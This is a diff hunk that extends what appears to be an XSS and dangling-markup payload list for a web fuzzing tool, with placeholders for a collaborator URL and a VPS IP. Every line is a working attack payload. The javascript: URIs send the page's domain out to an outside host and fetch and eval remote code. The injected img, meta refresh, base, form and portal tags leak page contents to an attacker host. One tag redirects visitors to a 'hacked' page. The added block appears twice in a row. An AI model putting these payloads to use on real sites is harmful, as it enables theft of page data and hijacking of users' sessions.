@@ -95,3 +95,27 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'!-VARIABLE_XSS
 jAvAScRipT:location=String.fromCharCode(<@to_charcode>!-VARIABLE_COLLABORATOR-!<@/to_charcode>,47,63)+document.domain
 jaVascRIPT:eval(atob(unescape('<@base64url>window.location="!-VARIABLE_COLLABORATOR-!/?domain="+document.domain<@/base64url>')))
 JaVaSCript:fetch(String.fromCharCode(<@to_charcode>!-VARIABLE_COLLABORATOR-!<@/to_charcode>,47,63)+document.domain,{ mode: 'no-cors' }).then(r=>r.text().then(t=>eval(t)))
+"><img src='//!-VARIABLE_VPS_IP_WITHOUT_HTTP-!?
+"><img src='!-VARIABLE_COLLABORATOR-!/log.php?HTML=
+"><meta http-equiv="refresh" content='0; url=!-VARIABLE_COLLABORATOR-!/log.php?text=
+"><meta http-equiv="refresh" content='0;URL=ftp://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!?a=
+"><table background='//!-VARIABLE_VPS_IP_WITHOUT_HTTP-!?'
+"><base href='!-VARIABLE_COLLABORATOR-!/'>
+"><button name=xss type=submit formaction='https://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!'>I get consumed!
+"><form action=!-VARIABLE_COLLABORATOR-!><input type="submit">Click Me</input><select name=xss><option
+"><noscript><form action=!-VARIABLE_COLLABORATOR-!><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
+"><html><head></head><body><script>top.window.location = "https://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!/hacked.html"</script></body></html>
+"><portal src='https://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!?
+"><input type='hidden' name='review_body' value="
+"><script src='/search?q=a&call=alert(1)'></script>
+"><img src='//!-VARIABLE_VPS_IP_WITHOUT_HTTP-!?
+"><img src='!-VARIABLE_COLLABORATOR-!/log.php?HTML=
+"><meta http-equiv="refresh" content='0; url=!-VARIABLE_COLLABORATOR-!/log.php?text=
+"><meta http-equiv="refresh" content='0;URL=ftp://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!?a=
+"><table background='//!-VARIABLE_VPS_IP_WITHOUT_HTTP-!?'
+"><base href='!-VARIABLE_COLLABORATOR-!/'>
+"><button name=xss type=submit formaction='https://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!'>I get consumed!
+"><form action=!-VARIABLE_COLLABORATOR-!><input type="submit">Click Me</input><select name=xss><option
+"><noscript><form action=!-VARIABLE_COLLABORATOR-!><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
+"><html><head></head><body><script>top.window.location = "https://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!/hacked.html"</script></body></html>
+"><portal src='https://!-VARIABLE_VPS_IP_WITHOUT_HTTP-!?
